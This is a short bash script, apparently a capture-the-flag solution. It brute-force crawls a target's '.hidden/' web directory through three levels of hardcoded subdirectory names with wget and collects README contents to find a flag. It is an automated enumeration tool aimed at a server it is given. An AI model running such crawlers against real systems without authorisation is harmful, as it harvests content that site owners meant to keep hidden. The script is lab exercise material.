#!/bin/bash
if [ -z "$1" ]
then
	echo 'Usage : ./hidden.sh ip'
	exit 0
fi
url="http://$1/.hidden/"
wget $url'/README'
line=`cat README`
if [[ "$line" =~ \ |\' ]]
then
   echo ""
else
   echo $line >> file.txt
fi
rm README
for elema in "amcbevgondgcrloowluziypjdh" "bnqupesbgvhbcwqhcuynjolwkm" "ceicqljdddshxvnvdqzzjgddht" "doxelitrqvhegnhlhrkdgfizgj" "eipmnwhetmpbhiuesykfhxmyhr" "ffpbexkomzbigheuwhbhbfzzrg" "ghouhyooppsmaizbmjhtncsvfz" "hwlayeghtcotqdigxuigvjufqn" "isufpcgmngmrotmrjfjonpmkxu" "jfiombdhvlwxrkmawgoruhbarp" "kpibbgxjqnvrrcpczovjbvijmz" "ldtafmsxvvydthtgflzhadiozs" "mrucagbgcenowkjrlmmugvztuh" "ntyrhxjbtndcpjevzurlekwsxt" "oasstobmotwnezhscjjopenjxy" "ppjxigqiakcrmqfhotnncfqnqg" "qcwtnvtdfslnkvqvzhjsmsghfw" "rlnoyduccpqxkvcfiqpdikfpvx" "sdnfntbyirzllbpctnnoruyjjc" "trwjgrgmfnzarxiiwvwalyvanm" "urhkbrmupxbgdnntopklxskvom" "viphietzoechsxwqacvpsodhaq" "whtccjokayshttvxycsvykxcfm" "xuwrcwjjrmndczfcrmwmhvkjnh" "yjxemfsgdlkbvvtjiylhdoaqkn" "zzfzjvjsupgzinctxeqtzzdzll"
do
	#echo $elema
	wget $url$elema'/README'
	line=`cat README`
	if [[ "$line" =~ \ |\' ]]
	then
	   echo ""
	else
	   echo $line >> file.txt
	fi
	rm README
	for elemb in "acbnunauucfplzmaglkvqgswwn" "bvwrujeymrvzurvywnjxzlfkwa" "ccevyakvydrjhsvbnwvestcfeb" "dephqnhvretuprssiccazdpwyt" "eotxvxzbogrepmvuiplzkfjohm" "fnkbjkxzduuctvrzpvpdsllkwm" "gubyklkxvljikilfdqyajypgpt" "hycgkytgbrqobqkozszhfgmven" "igeemtxnvexvxezqwntmzjltkt" "jzqhwxudbzrxyesccqbirteemr" "keyczixybfxybczctwbarfcjhk" "lacqgphmpkmzjmaojyqnasjyvj" "mrbnakzcmpldxxsjjssyujjvbx" "nvvgvrrnuepeduqsfwrcocoixo" "odgxyhuvecqvvfpzvtermzwisa" "pyvqjseoycohylldbjajacgwgx" "qihvsavsvodnsrnwhwxsjcwscf" "rtenpnkzuftuclrqrglitjsrgk" "sbkitppotcdimedtxzwlrocxbm" "ttlemtrngbjvrxotdxihcbhdzu" "uuqwurkperbaipglabcxpwcogm" "vsjtwjnsblouvdzmhzwwfiwimv" "wxkyoqkiafgluzmfpgcthpainy" "xpvwxitxurnldvlkeyedmlsson" "ycdpkqpcolzyfwsyjfehsolqvq" "zcgkxuyzzplsfnisngzlayvgee"
	do
		#echo $elemb
		wget $url$elema'/'$elemb'/README'
	        line=`cat README`
        	if [[ "$line" =~ \ |\' ]]
        	then
			echo ""
		else
           		echo $line >> file.txt
      		fi
		rm README
		for elemc in "ayuprpftypqspruffmkuucjccv" "becskiwlclcuqxshqmxhicouoj" "cqqssunxyhjgdwjoafgyzoollx" "dupoqdxhvrbqhaqokxsiigjnph" "emdxzqwvfkmkjvfbyxizowjlqr" "ftzcgojutitjfpqrdadyfewfov" "gtmgedazcchqobjyuufjkxmmam" "hrgjwugrgpxlrwntddjeoizipk" "iumzgolywwwsdqbunmlkagpfqu" "juavephzegfusfrqelvumphzat" "kbjjgbfcbchslgysntmtmcxzyr" "lmpanswobhwcozdqixbowvbrhw" "mfmtemmsbpftlvuuuwitbydbbt" "nzzuqitxumdibwksdfdbczvahq" "oehtfkmejiwsbvoqyztwllaqqb" "pupwvwozdhgnvmzdktffjxfiqc" "qtbemrfggdbetcjaiyvwxagqhn" "raetkuxexbsoiywlcceelgpkdl" "shdualhcrcmmzslakailyvnbbt" "tojkymyisskfbmweakfvwghyqs" "uwohzpdobnmnlwhfgmhsjnvtss" "vpaznrumfdlwgbxuqnfmunthun" "wqjklbcbceqvyecbsaityellly" "xhytouigdvshzvldngdskfmkpf" "yivtvgtfhotbwchtwottzwghaa" "zrhmbyumtnjbgoiwkksmroifhb"
		do
			#echo $elemc
			wget $url$elema'/'$elemb'/'$elemc'/README'
		        line=`cat README`
        		if [[ "$line" =~ \ |\' ]]
        		then
				echo ""
			else
           			echo $line >> file.txt
        		fi
			rm README
		done
	done
done
echo -e "\nThe flag is :\n"
cat file.txt
rm file.txt
